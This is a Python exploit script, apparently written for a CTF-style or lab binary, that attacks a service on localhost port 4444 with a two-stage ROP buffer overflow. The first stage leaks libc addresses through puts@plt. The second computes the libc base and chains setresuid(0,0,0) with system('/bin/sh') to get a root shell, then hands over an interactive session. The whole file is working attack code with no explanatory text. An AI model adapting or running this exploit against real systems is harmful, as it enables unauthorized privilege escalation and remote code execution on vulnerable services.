#!/usr/bin/env python3
import socket
import struct
from telnetlib import Telnet

HOST = "127.0.0.1"
PORT = 4444

buf = b'A'*76

buf += struct.pack("<I", 0x80483b0)  # puts@plt
buf += struct.pack("<I", 0x8048379)  # pr gadget
buf += struct.pack("<I", 0x804a010)  # gets GOT addr

buf += struct.pack("<I", 0x80483f0)  # _start addr

buf += b'\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print(s.recv(1024))  # regular output
s.send(buf)
print(s.recv(1024))  # regular output
resp = s.recv(1024)  # rop output
print(resp)

leak = resp.split(b"\n")[0]

gets_libc = struct.unpack("<I", leak[:4])[0]
puts_libc = struct.unpack("<I", leak[4:8])[0]

print("[*] gets addr:\t", hex(gets_libc))
print("[*] puts addr:\t", hex(puts_libc))

libc_base = puts_libc - 0x05fcb0  # puts libc offset
print("[*] libc base:\t", hex(libc_base))

setresuid = libc_base + 0x0b1660  # setresuid libc offset
system = libc_base + 0x03adb0     # system libc offset
bin_sh = libc_base + 0x15bb0b     # "/bin/sh" string libc offset

buf = b'B'*76

buf += struct.pack("<I", setresuid)
buf += struct.pack("<I", 0x80485d9)  # pppr gadget
buf += struct.pack("<I", 0)  # ruid arg
buf += struct.pack("<I", 0)  # euid arg
buf += struct.pack("<I", 0)  # suid arg

buf += struct.pack("<I", system)
buf += b'AAAA'  # random ret addr
buf += struct.pack("<I", bin_sh)

buf += b'\n'

s.send(buf)

t = Telnet()
t.sock = s
t.write(b'uname -a\n')
t.write(b'id\n')
try:
    t.interact()
except UnicodeDecodeError:
    print("decode_error")
    print(s.recv(1024).decode("utf-8"))
    t.interact()
